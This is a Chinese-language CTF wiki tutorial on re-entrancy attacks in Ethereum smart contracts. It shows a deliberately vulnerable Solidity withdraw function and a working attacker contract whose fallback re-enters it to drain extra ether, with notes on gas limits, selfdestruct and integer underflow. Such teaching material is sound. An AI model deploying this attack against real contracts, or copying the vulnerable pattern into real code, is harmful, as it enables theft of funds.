# Re-Entrancy

重入攻擊是智能合約中的經典攻擊。以太坊 The DAO 項目遭受的重入攻擊直接導致了以太坊（ETH）和以太坊經典（ETC）的硬分叉。

## 原理
假設有一個銀行合約實現了以下取款功能，在 `balanceOf[msg.sender]` 充足時，合約會轉賬相應數量的以太幣給調用者，並且將 `balanceOf` 減去相應值：

```solidity
contract Bank {
    mapping(address => uint256) public balanceOf;
    ...
    function withdraw(uint256 amount) public {
        require(balanceOf[msg.sender] >= amount);
        msg.sender.call.value(amount)();
        balanceOf[msg.sender] -= amount;
    }
}
```

這個實現的問題在於，“先給錢後記賬”。在以太坊中，合約的調用者可以是另一個智能合約，轉賬時收款合約的 fallback 函數會被調用。若 fallback 函數內再一次調用了對方的 withdraw 函數，由於此時 `balanceOf` 尚未減少，require 的條件仍然滿足，導致可以再次取款。需要注意的是，fallback 函數需要限制重入的次數，否則會因爲無限地循環調用，導致 gas 不足。假設攻擊合約的存款有 1 ether，可以如下實現取出 2 ether：

```solidity
contract Hacker {
    bool status = false;
    Bank b;

    constructor(address addr) public {
        b = Bank(addr);
    }

    function hack() public {
        b.withdraw(1 ether);
    }

    function() public payable {
        if (!status) {
            status = true;
            b.withdraw(1 ether);
        }
    }
}
```

此外有幾個注意點：

- 目標合約使用 call 發送以太幣時，默認提供所有剩餘 gas；call 操作改爲對提款者合約的調用亦可實現攻擊；但如果使用 transfer 或者 send 來發送以太幣，只有 2300 gas 供攻擊合約使用，是不足以完成重入攻擊的。
- 執行重入攻擊前，需要確認目標合約有足夠的以太幣來向我們多次轉賬。如果目標合約沒有 payable 的 fallback 函數，則需要新建一個合約，通過 `selfdestruct` 自毀強制轉賬。
- 上述 fallback 實現中，先改寫 `status` 後重入。如果反過來則還是會無限循環調用，這和重入漏洞的道理是一致的。

重入漏洞與整數下溢出漏洞關聯密切。在上述攻擊後，攻擊合約的存款由 1 ether 變爲 -1 ether。但注意到存款由 uint256 保存，負數實際上保存爲一個極大的正數，後續攻擊合約可以繼續使用這個大數額的存款。

## 題目

### 強網杯 2019
- 題目名稱 babybank

### N1CTF 2019
- 題目名稱 h4ck

!!! note
    注：題目附件相關內容可至 [ctf-challenges/blockchain](https://github.com/ctf-wiki/ctf-challenges/tree/master/blockchain) 倉庫尋找。
